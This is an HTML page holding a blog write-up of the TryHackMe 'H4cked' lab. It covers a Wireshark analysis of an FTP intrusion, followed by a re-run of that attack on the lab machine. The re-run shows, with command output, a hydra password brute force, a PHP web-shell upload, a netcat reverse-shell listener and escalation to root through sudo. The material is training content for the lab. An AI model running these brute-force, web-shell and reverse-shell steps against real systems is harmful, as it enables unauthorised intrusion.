@@ -1,0 +1,328 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="nair0lf32 ">
+<meta name="description" content="H4cked Hey! how are yo doing?
+We are usually on the red side, trying to hack machines
+But today we doing blue stuff
+Investigating a pcap file to catch a hacker
+Analysis we open Capture.pcapng with your favorite tool
+I go with wireshark
+Just read a bit and you already understand someone is trying to ftp as jenny
+Might be bruteforcing with hydra
+Follow the tcp stream on successful login to get the password password123" />
+<meta name="keywords" content="" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="" />
+<link rel="canonical" href="https://nair0lf32.github.io/zer0ne/writeups/tryhackme/h4cked/h4cked/" />
+
+
+    <title>
+        
+             :: Zer0ne  — welcome friend
+        
+    </title>
+
+
+
+<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" rel="stylesheet"
+    type="text/css">
+
+
+
+<link rel="stylesheet" href="https://nair0lf32.github.io/zer0ne/main.4e5c639214707eff609bb55fe49e183dee42258a73bc90e4cc7b0a84f900798a.css">
+
+
+
+    <link rel="apple-touch-icon" sizes="180x180" href="https://nair0lf32.github.io/zer0ne/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="https://nair0lf32.github.io/zer0ne/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="https://nair0lf32.github.io/zer0ne/favicon-16x16.png">
+    <link rel="manifest" href="https://nair0lf32.github.io/zer0ne/site.webmanifest">
+    <link rel="mask-icon" href="https://nair0lf32.github.io/zer0ne/safari-pinned-tab.svg" color="">
+    <link rel="shortcut icon" href="https://nair0lf32.github.io/zer0ne/favicon.ico">
+    <meta name="msapplication-TileColor" content="">
+
+
+<meta itemprop="name" content="">
+<meta itemprop="description" content="H4cked Hey! how are yo doing?
+We are usually on the red side, trying to hack machines
+But today we doing blue stuff
+Investigating a pcap file to catch a hacker
+Analysis we open Capture.pcapng with your favorite tool
+I go with wireshark
+Just read a bit and you already understand someone is trying to ftp as jenny
+Might be bruteforcing with hydra
+Follow the tcp stream on successful login to get the password password123">
+
+<meta itemprop="wordCount" content="648"><meta itemprop="image" content="https://nair0lf32.github.io/zer0ne"/>
+<meta itemprop="keywords" content="" />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://nair0lf32.github.io/zer0ne"/>
+
+<meta name="twitter:title" content=""/>
+<meta name="twitter:description" content="H4cked Hey! how are yo doing?
+We are usually on the red side, trying to hack machines
+But today we doing blue stuff
+Investigating a pcap file to catch a hacker
+Analysis we open Capture.pcapng with your favorite tool
+I go with wireshark
+Just read a bit and you already understand someone is trying to ftp as jenny
+Might be bruteforcing with hydra
+Follow the tcp stream on successful login to get the password password123"/>
+
+
+
+    <meta property="og:title" content="" />
+<meta property="og:description" content="H4cked Hey! how are yo doing?
+We are usually on the red side, trying to hack machines
+But today we doing blue stuff
+Investigating a pcap file to catch a hacker
+Analysis we open Capture.pcapng with your favorite tool
+I go with wireshark
+Just read a bit and you already understand someone is trying to ftp as jenny
+Might be bruteforcing with hydra
+Follow the tcp stream on successful login to get the password password123" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://nair0lf32.github.io/zer0ne/writeups/tryhackme/h4cked/h4cked/" /><meta property="og:image" content="https://nair0lf32.github.io/zer0ne"/><meta property="article:section" content="writeups" />
+
+<meta property="og:site_name" content="Zer0ne" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    </head>
+
+    
+        <body>
+    
+    
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="https://nair0lf32.github.io/zer0ne/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">&gt;</span>
+            <span class="logo__text">Zer0ne #</span>
+            <span class="logo__cursor" style=
+                  "
+                   background-color:#0FF00D;
+                   animation-duration:2s;">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner"><li><a href="https://nair0lf32.github.io/zer0ne/about">About</a></li><li><a href="https://nair0lf32.github.io/zer0ne/posts">Blog</a></li><li><a href="https://nair0lf32.github.io/zer0ne/writeups">Writeups</a></li>
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+                <span class="theme-toggle not-selectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+   <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+   3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+   13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+ </svg></span>
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+    <main class="post">
+
+        <div class="post-info">
+            
+            </p>
+        </div>
+
+        <article>
+            <h2 class="post-title"><a href="https://nair0lf32.github.io/zer0ne/writeups/tryhackme/h4cked/h4cked/"></a></h2>
+
+            
+            
+            
+
+            <div class="post-content">
+                <h1 id="h4cked">H4cked</h1>
+<!-- raw HTML omitted -->
+<p>Hey! how are yo doing?</p>
+<p>We are usually on the red side, trying to hack machines</p>
+<p>But today we doing blue stuff</p>
+<p>Investigating a pcap file to catch a hacker</p>
+<h2 id="analysis">Analysis</h2>
+<p>we open <code>Capture.pcapng</code> with your favorite tool</p>
+<p>I go with <code>wireshark</code></p>
+<p>Just read a bit and you already understand someone is trying to <code>ftp</code> as <code>jenny</code></p>
+<p>Might be bruteforcing with <code>hydra</code></p>
+<p>Follow the tcp stream on successful login to get the password <code>password123</code></p>
+<p>He was in <code>/var/www/html</code> then made a http get request for <code>/shell.php</code></p>
+<p>the file can be read after <code>ftp-data</code> filter is applied</p>
+<p>obviously its from <a href="http://pentestmonkey.net/tools/php-reverse-shell">pentestmonkeys</a>!</p>
+<p>I dumped the file content as printable text in a txt file for readabilty</p>
+<p>Now its time to follow the tcp stream again and get his actions inside <code>wir3</code></p>
+<p>he spawnned a more comfortable shell with the good ol'</p>
+<pre tabindex="0"><code>python3 -c &#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;
+</code></pre><p>then used <code>whoami</code> then <code>sudo su</code> like a boss</p>
+<p>jenny got too many privileges for someone using such a weak password</p>
+<p>My man cloned a badass backdoor from project [Reptile](git clone <a href="https://github.com/f0rb1dd3n/Reptile.git">https://github.com/f0rb1dd3n/Reptile.git</a>)</p>
+<p>Just read about it!</p>
+<p>Now its time to do better than the attacker</p>
+<h2 id="getting-access">Getting Access</h2>
+<p>he obviously changed the password so we can&rsquo;t just ssh as jenny (duh)</p>
+<p>so we have to re-do everything</p>
+<p>we can directly get into the hydra cracking</p>
+<pre tabindex="0"><code>└──╼ $hydra -l jenny -P /usr/share/wordlists/rockyou.txt ftp://10.10.100.132/
+Hydra v9.1 (c) 2020 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-02-01 17:33:29
+[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
+[DATA] attacking ftp://10.10.100.132:21/
+[STATUS] 93.00 tries/min, 93 tries in 00:01h, 14344339 to do in 2570:41h, 16 active
+[21][ftp] host: 10.10.100.132   login: jenny   password: 987654321
+1 of 1 target successfully completed, 1 valid password found
+[WARNING] Writing restore file because 13 final worker threads did not complete until end.
+[ERROR] 13 targets did not resolve or could not be connected
+[ERROR] 0 target did not complete
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-02-01 17:34:51
+</code></pre><p>He is doing better than jenny at least</p>
+<pre tabindex="0"><code>└──╼ $ftp 10.10.100.132
+Connected to 10.10.100.132.
+220 Hello FTP World!
+Name (10.10.100.132:nair0lf32): jenny
+331 Please specify the password.
+Password:
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+</code></pre><p>Updated his own shell to serve us as <code>shell2.php</code></p>
+<pre tabindex="0"><code>
+ftp&gt; put /h4cked/shell2.php shell2.php
+local: /h4cked/shell2.php remote: shell2.php
+227 Entering Passive Mode (10,10,100,132,140,101)
+150 Ok to send data.
+226 Transfer complete.
+5524 bytes sent in 0.00 secs (65.0382 MB/s)
+ftp&gt; ls
+227 Entering Passive Mode (10,10,100,132,170,74)
+150 Here comes the directory listing.
+-rw-r--r--    1 1000     1000        10918 Feb 01  2021 index.html
+-rwxrwxrwx    1 1000     1000         5493 Feb 01  2021 shell.php
+-rw-------    1 1000     1000         5524 Feb 01 17:12 shell2.php
+ftp&gt; chmod 777 shell2.php
+200 SITE CHMOD command ok.
+</code></pre><p>We are in too! Now Get that TTY!</p>
+<pre tabindex="0"><code>└──╼ $nc -lnvp 4444
+listening on [any] 4444 ...
+connect to [10.0.2.15] from (UNKNOWN) [10.0.2.2] 43016
+Linux wir3 4.15.0-135-generic #139-Ubuntu SMP Mon Jan 18 17:38:24 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
+ 17:15:04 up 39 min,  0 users,  load average: 0.00, 0.00, 0.10
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can&#39;t access tty; job control turned off
+
+$ python3 -c &#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;
+www-data@wir3:/$
+</code></pre><h2 id="privilege-escalation">privilege escalation</h2>
+<p>Now we do the good ol&rsquo; switcheroo</p>
+<pre tabindex="0"><code>www-data@wir3:/home/jenny$ su jenny
+su jenny
+Password: 987654321
+
+jenny@wir3:~$ sudo su
+sudo su
+[sudo] password for jenny: 987654321
+
+root@wir3:/home/jenny# 
+</code></pre><p>Get the flag</p>
+<pre tabindex="0"><code>root@wir3:/home/jenny# cd /root
+cd /root
+root@wir3:~# ls
+ls
+Reptile
+root@wir3:~# cd Reptile
+cd Reptile
+root@wir3:~/Reptile# ls
+ls
+configs   Kconfig  Makefile  README.md  userland
+flag.txt  kernel   output    scripts
+root@wir3:~/Reptile# cat flag.txt
+cat flag.txt
+straight_to_jail_intruder
+</code></pre><p>Nice,simple, easy room!</p>
+
+            </div>
+        </article>
+
+        <hr />
+
+        <div class="post-info">
+            
+            
+  		</div>
+    </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>&copy; 2022</span>
+            <span><a href="https://nair0lf32.github.io/zer0ne">nair0lf32</a></span>
+            <span><a href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC BY-NC 4.0</a></span>
+            <span><a href="https://nair0lf32.github.io/zer0ne/posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
+            
+        </div>
+    </div>
+    
+    
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>Powered by <a href="https://gohugo.io/">Hugo</a></span><span>Made with &#10084; by <a href="https://github.com/nair0lf32">nair0lf32</a></span><span>Theme used: <a href="https://github.com/rhazdon/hugo-theme-hello-friend-ng">Hello-friend-ng</a></span>
+        </div>
+    </div>
+    
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+<script type="text/javascript" src="https://nair0lf32.github.io/zer0ne/bundle.min.cf7fb2a9e24608a783e05e4472da2fdf008293289de1ad88d1cba5c143e7e414496dd33b6a228e92f8461ce0c8cbad3c9f9847e73e46dfbce0463393ddd1733a.js" integrity="sha512-z3&#43;yqeJGCKeD4F5Ectov3wCCkyid4a2I0culwUPn5BRJbdM7aiKOkvhGHODIy608n5hH5z5G37zgRjOT3dFzOg=="></script>
+
+
+
+    </body>
+</html>
